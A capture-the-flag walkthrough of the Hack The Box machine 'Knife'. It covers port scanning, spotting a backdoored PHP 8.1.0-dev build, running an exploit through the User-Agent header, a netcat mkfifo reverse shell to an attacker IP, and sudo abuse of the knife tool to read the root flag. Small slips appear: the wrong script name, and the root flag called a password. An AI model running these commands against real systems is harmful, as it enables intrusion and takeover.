#+TITLE: Knife
#+AUTHOR: Romeu Vieira

#+OPTIONS: html-style:nil
#+OPTIONS: html-scripts:nil

#+OPTIONS: author:nil
#+OPTIONS: email:nil
#+OPTIONS: date:t

#+PROPERTY: header-args :eval no

#+HTML_HEAD: <link rel="stylesheet" type="text/css" href="/style.css"/>

#+EXPORT_FILE_NAME: knife

* Enumeration

Starting with Nmap:

#+BEGIN_SRC
$ nmap -sC -sV -p1-65535 10.10.10.242
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-29 16:16 WEST
Nmap scan report for 10.10.10.242
Host is up (0.044s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.23 seconds

#+END_SRC

This being an obvious website (port =80= is open), then it should be added to
the =hosts= file, to simplify things:

#+BEGIN_SRC
10.10.10.242 knife.htb
#+END_SRC

The website is completely bare-bones. There is a fancy animation, but nothing is
clickable in the menu top-right. Path bruteforcing does not show any relevant
results.
From here, we should look at the response headers. In there we can see that
=Apache Httpd= version is =2.4.41=.

To see the rest of the response headers, we just run =cURL= like this:

#+BEGIN_SRC
$ curl -v knife.htb

Trying 10.10.10.242:80...
Connected to knife.htb (10.10.10.242) port 80 (#0)
> GET / HTTP/1.1
> Host: knife.htb
> User-Agent: curl/7.76.1
> Accept: */*
>
Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Sat, 29 May 2021 15:48:33 GMT
< Server: Apache/2.4.41 (Ubuntu)
< X-Powered-By: PHP/8.1.0-dev
< Vary: Accept-Encoding
< Transfer-Encoding: chunked
< Content-Type: text/html; charset=UTF-8
...
#+END_SRC

The website is also using PHP. Its version is =8.1.0-dev=, =dev= being a
development version. A search on =Google= for PHP exploits, the
[[https://packetstormsecurity.com/files/162749/PHP-8.1.0-dev-Backdoor-Remote-Command-Injection.html][first
result shows us a way of doing remove command injection!]].
This exploit verifies if =PHP/8.1.0-dev= appears in the headers and then does a
=GET= request with a specific value in =User-Agent=, something along the lines
of ="User-Agent": "zerodiumsystem("$remote_command");"=.

We save the exploit to =exploit.py= and try the =ls= command to test it:

#+BEGIN_SRC
$ python exploit.py -u http://knife.htb/ -c ls
[+] Results:
bin
boot
cdrom
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
#+END_SRC

We got the filesystem root directory and that means the exploit is working for
this machine.

* User

Obviously, there is a possibility to do a reverse shell, but using this script
to run commands seems to suffice.
Running the =id= command, we find out the current user is =james= and the user
flag is inside =/home/james/=.

* Root

Running the command =sudo -l= while in user =james=, we get the following
information:

#+begin_src
$ python exploit.py -u http://knife.htb/ -c "sudo -l"
[+] Results:
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife

#+end_src

We can run command =knife= as root! =knife= is a command-line tool that provides
an interface between a =chef= repo and the =Chef Infra Repository=
(https://docs.chef.io/workstation/knife/).
In the same link, we can also see that there is a subcommand called =exec=,
which runs Ruby scripts. Since we can run =knife= as root and run Ruby scripts
with it, probably running system commands through the scripts might be the best
course of action to get the root flag.
For this, a reverse shell is useful so we can write to a file. Going throught
the =ssh= route seems to be impossible, because it still asks for the password,
even though we have access to the private key. So reverse shell it is.
Using netcat to listen (=nc -lnvp 1337=), we then use the exploit to run the command to connect
to the reverse shell:

#+begin_src
$ python exploit.py -u http://knife.htb/ -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.76 1337 >/tmp/f"
#+end_src

And on the new shell, we run these commands:

#+begin_src
$ cd /home/james
$ echo "system(\"cat /root/root.txt\")" > script.rb
$ sudo knife exec script.sh
#+end_src

The output should be the root password!

#+begin_export html
<hr>
<footer>
<p><a class="footer" href="/index.html">Homepage</a></p>
<p><a class="footer" href="/writeups/htb/index.html">Back</a></p>
</footer>
#+end_export
